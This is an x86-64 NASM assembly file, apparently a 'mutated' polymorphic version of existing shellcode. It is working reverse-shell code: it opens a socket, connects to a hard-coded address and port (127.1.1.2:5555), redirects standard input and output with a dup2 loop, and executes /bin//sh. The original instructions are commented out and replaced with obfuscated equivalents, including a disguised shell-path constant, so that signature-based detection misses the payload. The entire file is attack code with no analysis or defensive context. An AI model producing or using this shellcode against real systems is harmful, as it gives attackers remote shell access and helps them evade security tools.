; File: shellcode-907_mutated.nasm
; Author: Petr Javorik

global _start

section .text

_start:

    ; push byte 41
    ; pop rax
    ; cdq
    xor rax, rax
    xor rdi, rdi
    add al, 41
    ; push byte 2
    ; pop rdi
    ; push byte 1
    ; pop rsi
    inc sil
    mov dil, sil
    inc dil
    syscall

    ; xchg eax, edi
    xchg rax, rdi
    ; mov al, 42
    add al, 40
    ; mov rcx, 0x201017fb3150002
    ; neg rcx   ; deleted
    mov rcx, 0x201017fb314fffd
    add rcx, 5
    push rcx
    ; push rsp
    ; pop rsi
    mov rsi, rsp
    ; mov dl, 16
    add dl, 16
    syscall

    ; push byte 3
    ; pop rsi
    mov rsi, rdx
    sub sil, 13
    dup2_loop:
        mov al, 33
        dec esi
        syscall
        jnz dup2_loop

    ; cdq
    sub dl, 16
    mov al, 59
    push rdx
    ; mov rcx, 0x68732f2f6e69622f
    mov rcx, 0x66722dafbb54622d
    add rcx, [rsp +8]
    push rcx
    ; push rsp
    ; pop rdi
    mov rdi, rsp
    syscall
